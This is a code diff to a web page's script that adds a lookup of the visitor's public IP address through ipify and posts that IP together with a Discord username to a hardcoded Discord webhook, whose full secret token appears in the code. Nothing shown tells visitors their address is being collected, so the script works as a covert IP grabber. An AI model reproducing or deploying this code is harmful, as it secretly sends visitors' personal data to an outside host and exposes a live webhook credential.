@@ -78,24 +78,31 @@
                 return;
             }
 
-            // Set the IP address as "IP-4"
-            const ip = 'IP-4';
-            // Send the IP address and Discord username to the Discord webhook
-            const webhookUrl = 'https://discord.com/api/webhooks/1236739657505439854/xrWrzCfXnGaQ_TcMO7xXVMUw5LZU6k_fRuEIplzFBaGTB9R7hc4YJC579feuU1UqRNWx';
-            const message = {
-                content: `!(${ip}) - [${discordUsername}]`
-            };
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(message)
-            })
-            .catch(error => {
-                console.error('ERROR', error);
-            });
+            // Get the IP address using ipify
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    // Send the IP address and Discord username to the Discord webhook
+                    const webhookUrl = 'https://discord.com/api/webhooks/1236739657505439854/xrWrzCfXnGaQ_TcMO7xXVMUw5LZU6k_fRuEIplzFBaGTB9R7hc4YJC579feuU1UqRNWx';
+                    const message = {
+                        content: `!(${ip}) - [${discordUsername}]`
+                    };
+                    
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(message)
+                    })
+                    .catch(error => {
+                        console.error('ERROR', error);
+                    });
+                })
+                .catch(error => {
+                    console.error('ERROR', error);
+                });
         });
     </script>
 </body>
